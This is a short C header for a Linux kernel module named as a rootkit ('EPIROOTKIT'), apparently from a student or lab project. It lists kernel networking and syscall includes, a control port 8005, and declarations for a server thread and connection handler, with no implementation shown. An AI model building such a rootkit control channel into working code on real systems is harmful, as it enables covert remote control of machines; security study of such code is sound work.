#ifndef EPIROOTKIT_H
#define EPIROOTKIT_H

#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/version.h>
#include <linux/fs.h>
#include <linux/uaccess.h>
#include <linux/slab.h>
#include <linux/net.h>
#include <linux/in.h>
#include <linux/socket.h>
#include <linux/kthread.h>
#include <net/sock.h>
#include <linux/syscalls.h>
#include <linux/crc32.h>
#include <linux/list.h>
#include <linux/delay.h>
#include <linux/namei.h>
#include <linux/dcache.h>
#include <crypto/hash.h>
#include <linux/crypto.h>

#define PORT_CONTROLE 8005

extern struct socket *sockfd;
extern struct task_struct *tache_serveur;

int creer_serveur(void *arg);
int traiter_connexion(struct socket *sock_client);

#endif
